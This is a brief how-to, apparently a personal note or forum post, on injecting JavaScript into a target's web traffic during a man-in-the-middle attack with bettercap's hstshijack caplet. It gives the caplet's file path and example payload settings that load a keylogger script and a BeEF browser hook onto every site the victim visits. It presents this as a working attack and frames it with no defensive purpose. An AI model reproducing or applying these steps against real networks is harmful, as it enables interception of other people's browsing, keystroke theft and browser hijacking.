Man in the middle, javascript inject.

This means you can inject anything to a website,first create your javascript file and save it
Then go to /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap
List the domains you want your JS code to inject to in the set hstshijack.payloads section.
You can set as much domains as you want. For example:
set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/root/Downloads/inject_beef.js,*:

Because we want to inject it to every website the target go to we will add       ,*: 
As showed in the example. After the Comma we will add the JS file we want to inejct.
So for example:
set hstshijack.payloads        *:/root/Downloads/inject_beef.js,*:/root/Desktop/alert.js

And thats it save it and run the man in the middle attack, also the hstshijack plugin.
Now everytime the target load a web page the JS code would get executed.
